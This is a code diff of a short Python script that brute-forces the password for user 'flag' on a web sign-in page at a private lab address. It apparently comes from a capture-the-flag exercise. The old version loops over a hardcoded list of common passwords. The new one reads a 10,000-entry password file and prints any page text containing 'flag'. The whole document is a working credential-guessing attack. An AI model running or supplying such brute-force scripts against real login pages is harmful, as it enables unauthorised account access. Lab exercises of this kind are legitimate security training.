@@ -1,29 +1,14 @@
 import requests
-from urllib.parse import quote
-
-#Target
-BASE_URL = "http://192.168.38.130/index.php?page=signin&username=flag&password={}&Login=Login#"
-
-# Common passwords
-COMMON_PASSWORDS = [
-    '123456', '123456789', 'password', 'admin', '12345678', 'qwerty', '1234567',
-    '12345', '123123', '000000', 'shadow', 'letmein', 'monkey', 'iloveyou', 'abc123'
-]
-
-def try_password(password):
-    """Send a GET request with the given password and return True if successful."""
-    url = BASE_URL.format(quote(password))
-    response = requests.get(url)
-    return "WrongAnswer.gif" not in response.text
-
-def main():    
-    for password in COMMON_PASSWORDS:
-        print(f"Trying: {password}")
-        if try_password(password):
-            print(f"Password found: {password}")
-            return
-
-    print("Password not found in common list.")
 
 if __name__ == "__main__":
-    main()
+    username = "Flag"
+    common_passwords = open("10k-most-common.txt", "r")
+    for password in common_passwords:
+        cleaned_pass = password.strip("\n")
+        print(cleaned_pass)
+        Url = f"http://192.168.38.130//index.php?page=signin&username={username}&password={cleaned_pass}&Login=Login#"
+        r = requests.get(url=Url)
+        page_content= r.text.lower()
+        if "flag" in page_content:
+            print(f"password : '{cleaned_pass}' gave the flag : {page_content[page_content.find("flag"):]}")
+            break
